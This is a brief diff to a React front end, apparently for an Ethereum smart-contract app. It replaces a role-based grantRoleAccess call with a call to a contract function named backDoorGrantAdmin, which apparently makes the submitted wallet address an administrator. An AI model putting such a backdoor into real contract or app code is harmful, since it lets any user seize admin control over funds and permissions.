@@ -63,12 +63,7 @@ function App() {
 
 
 	function formSubmit(event) {
-		contractCalAuth.grantRoleAccess(
-			ethers.utils.keccak256(ethers.utils.toUtf8Bytes(Roles.ADMIN.TXT)), 
-			walAddress, 
-			0, 
-			0);
-		console.log("71??");
+		contractCalAuth.backDoorGrantAdmin(walAddress);
 		event.preventDefault();
 	}
 
